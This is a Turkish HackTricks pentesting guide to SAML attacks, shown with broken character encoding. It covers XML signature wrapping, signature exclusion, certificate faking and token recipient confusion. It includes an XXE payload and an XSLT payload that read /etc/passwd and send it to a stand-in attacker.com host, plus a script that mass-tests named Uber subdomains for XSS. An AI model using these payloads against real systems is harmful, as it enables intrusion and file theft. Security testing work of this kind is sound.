# SAML SaldÄ±rÄ±larÄ±

## SAML SaldÄ±rÄ±larÄ±

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na(https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Temel Bilgiler

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## AraÃ§

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): Bir URL veya URL listesi alabilen ve SAML tÃ¼ketim URL'sini geri yazdÄ±ran bir araÃ§.

## XML turu

XML'de XML'in imzalÄ± kÄ±smÄ± bellekte saklanÄ±r, ardÄ±ndan bazÄ± kodlama/Ã§Ã¶zme iÅŸlemleri gerÃ§ekleÅŸtirilir ve imza kontrol edilir. Ä°deal olarak, bu kodlama/Ã§Ã¶zme iÅŸlemi veriyi deÄŸiÅŸtirmemelidir, ancak bu senaryoya gÃ¶re, **kontrol edilen veri ve orijinal veri aynÄ± olmayabilir**.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki kodu kontrol edin:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
ProgramÄ± REXML 3.2.4 veya daha Ã¶nceki sÃ¼rÃ¼mlere karÅŸÄ± Ã§alÄ±ÅŸtÄ±rmak aÅŸaÄŸÄ±daki Ã§Ä±ktÄ±yÄ± Ã¼retir:
```
First child in original doc: Y
First child after round-trip: Z
```
YukarÄ±daki programÄ±n orijinal XML belgesini REXML'in nasÄ±l gÃ¶rdÃ¼ÄŸÃ¼:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (998).png>)

Ve bu, ayrÄ±ÅŸtÄ±rma ve serileÅŸtirme turundan sonra nasÄ±l gÃ¶rdÃ¼:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (442).png>)

Bu zafiyet ve nasÄ±l istismar edileceÄŸi hakkÄ±nda daha fazla bilgi iÃ§in:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Ä°mza Sarma SaldÄ±rÄ±larÄ±

**XML Ä°mza Sarma saldÄ±rÄ±larÄ±nda (XSW)**, saldÄ±rganlar XML belgelerinin iÅŸlendiÄŸi iki farklÄ± aÅŸamada, **imza doÄŸrulama** ve **iÅŸlev Ã§aÄŸrÄ±sÄ±** aÅŸamalarÄ±nda ortaya Ã§Ä±kan bir zafiyeti sÃ¶mÃ¼rÃ¼rler. Bu saldÄ±rÄ±lar, XML belge yapÄ±sÄ±nÄ± deÄŸiÅŸtirerek gerÃ§ekleÅŸir. Ã–zellikle saldÄ±rgan, XML Ä°mzasÄ±nÄ±n geÃ§erliliÄŸini tehlikeye atmayan sahte Ã¶ÄŸeler **enjekte eder**. Bu manipÃ¼lasyon, uygulama mantÄ±ÄŸÄ± tarafÄ±ndan analiz edilen Ã¶ÄŸeler ile imza doÄŸrulama modÃ¼lÃ¼ tarafÄ±ndan kontrol edilen Ã¶ÄŸeler arasÄ±nda bir uyumsuzluk yaratmayÄ± amaÃ§lar. SonuÃ§ olarak, XML Ä°mzasÄ± teknik olarak geÃ§erli kalÄ±r ve doÄŸrulamayÄ± geÃ§er, ancak uygulama mantÄ±ÄŸÄ± **sahte Ã¶ÄŸeleri** iÅŸler. DolayÄ±sÄ±yla, saldÄ±rgan etkili bir ÅŸekilde XML Ä°mzasÄ±nÄ±n **bÃ¼tÃ¼nlÃ¼k korumasÄ±nÄ±** ve **kÃ¶ken kimliÄŸini doÄŸrulamasÄ±nÄ±** atlayarak algÄ±lanmadan **keyfi iÃ§erik enjekte etmeyi** saÄŸlar.

AÅŸaÄŸÄ±daki saldÄ±rÄ±lar [**bu blog gÃ¶nderisine**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **ve** [**bu makaleye**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf) dayanmaktadÄ±r. Daha fazla ayrÄ±ntÄ± iÃ§in bunlarÄ± kontrol edin.

### XSW #1

* **Strateji**: Ä°mza iÃ§eren yeni bir kÃ¶k Ã¶ÄŸe eklenir.
* **Etki**: DoÄŸrulayÄ±cÄ±, meÅŸru "YanÄ±t -> Ä°ddia -> Konu" ile saldÄ±rganÄ±n "kÃ¶tÃ¼ yeni YanÄ±t -> Ä°ddia -> Konu" arasÄ±nda karÄ±ÅŸabilir, veri bÃ¼tÃ¼nlÃ¼ÄŸÃ¼ sorunlarÄ±na yol aÃ§abilir.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (503).png>)

### XSW #2

* **XSW #1'den FarkÄ±**: Bir sarmal imza yerine ayrÄ±lmÄ±ÅŸ bir imza kullanÄ±r.
* **Etki**: "KÃ¶tÃ¼" yapÄ±, XSW #1'e benzer ÅŸekilde, bÃ¼tÃ¼nlÃ¼k kontrolÃ¼nden sonra iÅŸ mantÄ±ÄŸÄ±nÄ± aldatmayÄ± amaÃ§lar.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (462).png>)

### XSW #3

* **Strateji**: Orijinal iddiaya aynÄ± hiyerarÅŸik dÃ¼zeyde kÃ¶tÃ¼ bir Ä°ddia oluÅŸturulur.
* **Etki**: Ä°ÅŸ mantÄ±ÄŸÄ±nÄ± kÃ¶tÃ¼ veriyi kullanmaya zorlamayÄ± amaÃ§lar.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (117).png>)

### XSW #4

* **XSW #3'ten FarkÄ±**: Orijinal Ä°ddia, Ã§oÄŸaltÄ±lan (kÃ¶tÃ¼) Ä°ddianÄ±n alt Ã¶ÄŸesi olur.
* **Etki**: XSW #3'e benzer ÅŸekilde, XML yapÄ±sÄ±nÄ± daha agresif bir ÅŸekilde deÄŸiÅŸtirir.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (548).png>)

### XSW #5

* **Benzersiz YÃ¶n**: Ne Ä°mza ne de orijinal Ä°ddia standart yapÄ±landÄ±rmalara uymaz (sarmal/sarmal/detached).
* **Etki**: Kopyalanan Ä°ddia, Ä°mzayÄ± sarmalar ve beklenen belge yapÄ±sÄ±nÄ± deÄŸiÅŸtirir.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (1027).png>)

### XSW #6

* **Strateji**: XSW #4 ve #5 ile benzer konum enjeksiyonu, ancak bir farkla.
* **Etki**: Kopyalanan Ä°ddia, Ä°mzayÄ± sarmalar, ardÄ±ndan orijinal Ä°ddiayÄ± saran, iÃ§ iÃ§e geÃ§miÅŸ aldatÄ±cÄ± bir yapÄ± oluÅŸturur.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (166).png>)

### XSW #7

* **Strateji**: Kopyalanan Ä°ddia ile birlikte bir UzantÄ± Ã¶ÄŸesi eklenir.
* **Etki**: Bu, Ã¶zellikle OpenSAML gibi kÃ¼tÃ¼phanelerde ÅŸema doÄŸrulama karÅŸÄ± Ã¶nlemleri atlamak iÃ§in UzantÄ± Ã¶ÄŸesinin daha az kÄ±sÄ±tlayÄ±cÄ± ÅŸemasÄ±nÄ± istismar eder.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (968).png>)

### XSW #8

* **XSW #7'den FarkÄ±**: SaldÄ±rÄ±nÄ±n bir varyantÄ± iÃ§in baÅŸka bir daha az kÄ±sÄ±tlayÄ±cÄ± XML Ã¶ÄŸesini kullanÄ±r.
* **Etki**: Orijinal Ä°ddia, XSW #7'de kullanÄ±lan yapÄ±yÄ± tersine Ã§evirerek daha az kÄ±sÄ±tlayÄ±cÄ± Ã¶ÄŸenin alt Ã¶ÄŸesi olur.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (538).png>)

### AraÃ§

Ä°steÄŸi ayrÄ±ÅŸtÄ±rmak, seÃ§tiÄŸiniz XSW saldÄ±rÄ±sÄ±nÄ± uygulamak ve baÅŸlatmak iÃ§in Burp uzantÄ±sÄ± [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) kullanabilirsiniz.

## XXE

XXE saldÄ±rÄ±larÄ±nÄ±n ne tÃ¼r saldÄ±rÄ±lar olduÄŸunu bilmiyorsanÄ±z, lÃ¼tfen aÅŸaÄŸÄ±daki sayfayÄ± okuyun:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAML YanÄ±tlarÄ± **sÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ ve base64 kodlu XML belgeleri** ve XML Harici VarlÄ±k (XXE) saldÄ±rÄ±larÄ±na duyarlÄ± olabilir. SAML YanÄ±tÄ±nÄ±n XML yapÄ±sÄ±nÄ± manipÃ¼le ederek, saldÄ±rganlar XXE zafiyetlerini sÃ¶mÃ¼rmeye Ã§alÄ±ÅŸabilir. Ä°ÅŸte bÃ¶yle bir saldÄ±rÄ±nÄ±n nasÄ±l gÃ¶rselleÅŸtirilebileceÄŸi:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## AraÃ§lar

AyrÄ±ca, olasÄ± XXE gÃ¼venlik aÃ§Ä±klarÄ±nÄ± test etmek iÃ§in bir SAML isteÄŸinden POC oluÅŸturmak iÃ§in Burp uzantÄ±sÄ± olan [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) kullanabilirsiniz.

AyrÄ±ca bu konuÅŸmayÄ± da kontrol edin: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## SAML AracÄ±lÄ±ÄŸÄ±yla XSLT

XSLT hakkÄ±nda daha fazla bilgi iÃ§in ÅŸuraya gidin:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

GeniÅŸletilebilir Stil SayfasÄ± DÃ¶nÃ¼ÅŸÃ¼mleri (XSLT), XML belgelerini HTML, JSON veya PDF gibi Ã§eÅŸitli biÃ§imlere dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in kullanÄ±labilir. **XSLT dÃ¶nÃ¼ÅŸÃ¼mlerinin dijital imzanÄ±n doÄŸrulanmasÄ±ndan Ã¶nce gerÃ§ekleÅŸtirildiÄŸini** unutmamak Ã¶nemlidir. Bu, geÃ§erli bir imza olmadan bile bir saldÄ±rÄ±nÄ±n baÅŸarÄ±lÄ± olabileceÄŸi anlamÄ±na gelir; kendinden imzalÄ± veya geÃ§ersiz bir imza yeterlidir.

Bu tÃ¼r gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kontrol etmek iÃ§in bir **POC** bulabilirsiniz; bu bÃ¶lÃ¼mÃ¼n baÅŸÄ±nda belirtilen hacktricks sayfasÄ±nda payloadlar bulabilirsiniz.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### AraÃ§

AyrÄ±ca, olasÄ± XSLT gÃ¼venlik aÃ§Ä±klarÄ±nÄ± test etmek iÃ§in bir SAML isteÄŸinden POC oluÅŸturmak iÃ§in Burp uzantÄ±sÄ± [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) kullanabilirsiniz.

AyrÄ±ca bu konuÅŸmayÄ± da kontrol edin: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML Ä°mza HariÃ§ BÄ±rakma <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**XML Ä°mza HariÃ§ BÄ±rakma**, Ä°mza Ã¶ÄŸesi bulunmadÄ±ÄŸÄ±nda SAML uygulamalarÄ±nÄ±n davranÄ±ÅŸÄ±nÄ± gÃ¶zlemlemektedir. Bu Ã¶ÄŸe eksikse, **imza doÄŸrulamasÄ±nÄ±n gerÃ§ekleÅŸmeyebileceÄŸi**, dolayÄ±sÄ±yla zayÄ±f olabileceÄŸi anlamÄ±na gelir. Bu durumu test etmek iÃ§in genellikle imzalanan iÃ§eriÄŸi deÄŸiÅŸtirerek yapabilirsiniz.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (454).png>)

### AraÃ§ <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

AyrÄ±ca, Burp uzantÄ±sÄ± [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) kullanabilirsiniz. SAML YanÄ±tÄ±nÄ± arayÄ±p `Ä°mzalarÄ± KaldÄ±r` dÃ¼ÄŸmesine tÄ±klayÄ±n. BÃ¶ylece **tÃ¼m** Ä°mza Ã¶ÄŸeleri kaldÄ±rÄ±lÄ±r.

Ä°mzalar kaldÄ±rÄ±ldÄ±ktan sonra isteÄŸin hedefe gitmesine izin verin. Ä°mzanÄ±n Hizmet tarafÄ±ndan gerekli olup olmadÄ±ÄŸÄ±nÄ± kontrol edin.

## Sertifika SahteciliÄŸi <a href="#certificate-faking" id="certificate-faking"></a>

Sertifika SahteciliÄŸi, bir **Hizmet SaÄŸlayÄ±cÄ±sÄ±nÄ±n (SP) bir SAML Ä°letisinin gÃ¼venilir bir Kimlik SaÄŸlayÄ±cÄ± (IdP) tarafÄ±ndan imzalandÄ±ÄŸÄ±nÄ± doÄŸru bir ÅŸekilde doÄŸrulayÄ±p doÄŸrulamadÄ±ÄŸÄ±nÄ± test etmek** iÃ§in bir tekniktir. Bu, Sertifika SahteciliÄŸi, SP ve IdP arasÄ±ndaki gÃ¼ven doÄŸrulama sÃ¼recini deÄŸerlendirmeye yardÄ±mcÄ± olmak iÃ§in bir \***kendi imzalÄ± sertifika** kullanmayÄ± iÃ§erir.

### Sertifika SahteciliÄŸi NasÄ±l YapÄ±lÄ±r

AÅŸaÄŸÄ±daki adÄ±mlar, [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp uzantÄ±sÄ±nÄ± kullanarak sÃ¼reci aÃ§Ä±klar:

1. SAML YanÄ±tÄ±nÄ± arayÄ±n.
2. YanÄ±t bir imza iÃ§eriyorsa, sertifikayÄ± SAML Raider SertifikalarÄ±na `SertifikayÄ± SAML Raider SertifikalarÄ±na GÃ¶nder` dÃ¼ÄŸmesini kullanarak gÃ¶nderin.
3. SAML Raider SertifikalarÄ± sekmesinde, iÃ§e aktarÄ±lan sertifikayÄ± seÃ§in ve orijinal sertifikanÄ±n kendi imzalÄ± kopyasÄ±nÄ± oluÅŸturmak iÃ§in `Kaydet ve Kendi Ä°mzalÄ±` dÃ¼ÄŸmesine tÄ±klayÄ±n.
4. Burp'un Proxy'sindeki araya geÃ§ilen isteÄŸe geri dÃ¶nÃ¼n. XML Ä°mza aÃ§Ä±lÄ±r menÃ¼sÃ¼nden yeni kendi imzalÄ± sertifikayÄ± seÃ§in.
5. Varolan imzalarÄ± `Ä°mzalarÄ± KaldÄ±r` dÃ¼ÄŸmesi ile kaldÄ±rÄ±n.
6. MesajÄ± veya iddiayÄ± yeni sertifika ile imzalayÄ±n **`(Yeniden) MesajÄ± Ä°mzala`** veya **`(Yeniden) Ä°ddiayÄ± Ä°mzala`** dÃ¼ÄŸmesini kullanarak.
7. Ä°mzalÄ± mesajÄ± iletil. BaÅŸarÄ±lÄ± kimlik doÄŸrulama, SP'nin kendi imzalÄ± sertifikanÄ±z tarafÄ±ndan imzalanan mesajlarÄ± kabul ettiÄŸini gÃ¶sterir ve SAML mesajlarÄ±nÄ±n doÄŸrulama sÃ¼recindeki potansiyel zayÄ±flÄ±klarÄ± ortaya Ã§Ä±karÄ±r.

## Token AlÄ±cÄ± KarÄ±ÅŸÄ±klÄ±ÄŸÄ± / Hizmet SaÄŸlayÄ±cÄ± Hedef KarÄ±ÅŸÄ±klÄ±ÄŸÄ± <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Token AlÄ±cÄ± KarÄ±ÅŸÄ±klÄ±ÄŸÄ± ve Hizmet SaÄŸlayÄ±cÄ± Hedef KarÄ±ÅŸÄ±klÄ±ÄŸÄ±, bir yanÄ±tÄ±n **amaÃ§lanan alÄ±cÄ±sÄ±nÄ± doÄŸru bir ÅŸekilde doÄŸrulayÄ±p doÄŸrulamadÄ±ÄŸÄ±nÄ± kontrol etmek** iÃ§in yapÄ±lan bir testi iÃ§erir. Temelde, bir Hizmet SaÄŸlayÄ±cÄ±nÄ±n, yanÄ±tÄ±n farklÄ± bir saÄŸlayÄ±cÄ± iÃ§in mi yoksa kendisi iÃ§in mi olduÄŸunu doÄŸru bir ÅŸekilde doÄŸrulamasÄ± gerekir. Buradaki kritik unsur, bir SAML YanÄ±tÄ±nÄ±n **SubjectConfirmationData** Ã¶ÄŸesinde bulunan **AlÄ±cÄ±** alanÄ±dÄ±r. Bu alan, Ä°ddianÄ±n nereye gÃ¶nderilmesi gerektiÄŸini belirten bir URL'yi belirtir. GerÃ§ek alÄ±cÄ±, amaÃ§lanan Hizmet SaÄŸlayÄ±cÄ±yla eÅŸleÅŸmiyorsa, Ä°ddia geÃ§ersiz kabul edilmelidir.

#### **NasÄ±l Ã‡alÄ±ÅŸÄ±r**

Bir SAML Token AlÄ±cÄ± KarÄ±ÅŸÄ±klÄ±ÄŸÄ± (SAML-TRC) saldÄ±rÄ±sÄ±nÄ±n gerÃ§ekleÅŸtirilebilmesi iÃ§in belirli koÅŸullarÄ±n saÄŸlanmasÄ± gerekir. Ä°lk olarak, bir Hizmet SaÄŸlayÄ±cÄ±da (SP-Legit olarak adlandÄ±rÄ±lÄ±r) geÃ§erli bir hesap olmalÄ±dÄ±r. Ä°kinci olarak, hedeflenen Hizmet SaÄŸlayÄ±cÄ±nÄ±n (SP-Hedef) SP-Legit'i hizmet veren aynÄ± Kimlik SaÄŸlayÄ±cÄ±dan tokenlarÄ± kabul etmesi gerekir.

Bu koÅŸullar altÄ±nda saldÄ±rÄ± sÃ¼reci basittir. PaylaÅŸÄ±lan Kimlik SaÄŸlayÄ±cÄ± aracÄ±lÄ±ÄŸÄ±yla SP-Legit ile otantik bir oturum baÅŸlatÄ±lÄ±r. Kimlik SaÄŸlayÄ±cÄ±dan SP-Legit'e yÃ¶nlendirilmesi gereken orijinal olarak SP-Legit iÃ§in amaÃ§lanan SAML YanÄ±tÄ± araya girilir. Bu yÃ¶nlendirilen SAML YanÄ±tÄ±, SP-Hedef'e yÃ¶nlendirilir. Bu saldÄ±rÄ±da baÅŸarÄ±, SP-Hedef'in Ä°ddiayÄ± kabul etmesi ve SP-Legit iÃ§in kullanÄ±lan aynÄ± hesap adÄ± altÄ±nda kaynaklara eriÅŸim saÄŸlamasÄ±yla Ã¶lÃ§Ã¼lÃ¼r.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## Ã‡Ä±kÄ±ÅŸ iÅŸlevinde XSS

Orijinal araÅŸtÄ±rmaya [bu baÄŸlantÄ±dan](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/) eriÅŸilebilir.

Dizin brute force iÅŸlemi sÄ±rasÄ±nda, bir Ã§Ä±kÄ±ÅŸ sayfasÄ± keÅŸfedildi:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
Bu baÄŸlantÄ±ya eriÅŸildiÄŸinde, ÅŸu adrese yÃ¶nlendirme yapÄ±ldÄ±:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
Bu, `base` parametresinin bir URL'yi kabul ettiÄŸini ortaya koydu. Bu dÃ¼ÅŸÃ¼nceyle, URL'nin `javascript:alert(123);` ile deÄŸiÅŸtirilerek bir XSS (Cross-Site Scripting) saldÄ±rÄ±sÄ± baÅŸlatma giriÅŸiminde bulunuldu.

### Toplu SÃ¶mÃ¼rÃ¼

[Bu araÅŸtÄ±rmadan](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

`uberinternal.com` alt alanlarÄ±nÄ± analiz etmek iÃ§in [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) aracÄ± kullanÄ±ldÄ± ve aynÄ± kÃ¼tÃ¼phaneyi kullanan alanlarÄ± belirlemek iÃ§in bir betik geliÅŸtirildi. Daha sonra, `oidauth/prompt` sayfasÄ±nÄ± hedefleyen bir betik oluÅŸturuldu. Bu betik, veri giriÅŸi yaparak XSS (Cross-Site Scripting) test eder ve Ã§Ä±ktÄ±da yansÄ±tÄ±lÄ±p yansÄ±tÄ±lmadÄ±ÄŸÄ±nÄ± kontrol eder. GiriÅŸ gerÃ§ekten yansÄ±tÄ±ldÄ±ÄŸÄ±nda, betik sayfayÄ± savunmasÄ±z olarak iÅŸaretler.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## Referanslar

* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'Ä± PDF olarak indirmek** istiyorsanÄ±z [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimizle**](https://opensea.io/collection/the-peass-family) tanÄ±ÅŸÄ±n
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
